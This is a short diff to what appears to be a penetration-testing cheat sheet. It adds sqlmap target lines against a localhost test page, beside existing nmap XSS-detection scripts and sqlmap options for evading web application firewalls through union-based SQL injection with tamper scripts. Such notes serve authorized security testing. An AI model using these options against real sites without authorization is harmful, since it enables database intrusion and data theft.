@@ -148,6 +148,9 @@ nmap -sV -PN -p443 --script http-xssed.nse --script http-stored-xss.nse --script
 
 =======================SQLMAP Bypass Waf=====================================
 
+-u "http://localhost/vuln/test.php?feature=music&song=1" -p song
+-u "http://localhost/vuln/test.php?feature=music&song=1" -p 'song,feature'
+
 --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
 --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
 --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
